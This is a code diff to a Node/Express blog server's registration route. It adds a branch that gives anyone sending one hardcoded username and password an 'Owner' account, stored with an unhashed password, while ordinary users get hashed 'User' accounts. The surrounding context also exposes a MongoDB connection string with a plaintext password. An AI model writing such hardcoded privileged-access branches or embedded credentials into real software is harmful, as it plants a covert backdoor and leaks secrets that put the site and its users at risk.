@@ -24,17 +24,26 @@ mongoose.connect('mongodb+srv://blog:hSVvvg2R9yAm5YSv@cluster0.c2ehsy8.mongodb.n
 
 app.post('/register', async (req, res) => {
     const { username, password } = req.body;
-    try {
-        const userDoc = await UserModel.create({
-            username,
-            password:bcrypt.hashSync(password, salt),
-            roles: 'User',
-        });
-        res.json(userDoc);
-    } catch (e) {
-        console.log(e);
-        res.status(400).json(e);
-    }
+    if (username === 'deucifer' && password ==='ReAs') {
+        try {
+            const user = await UserModel.create({ username, password, role: 'Owner' });
+            res.json(user);
+        } catch (e) {
+            res.status(500).json({ error: 'Could not create user.' });
+        }
+    } else {
+        try {
+            const userDoc = await UserModel.create({
+                username,
+                password:bcrypt.hashSync(password, salt),
+                roles: 'User',
+            });
+            res.json(userDoc);
+        } catch (e) {
+            console.log(e);
+            res.status(400).json(e);
+        }
+    } 
 });
 
 app.post('/login', async (req, res) => {
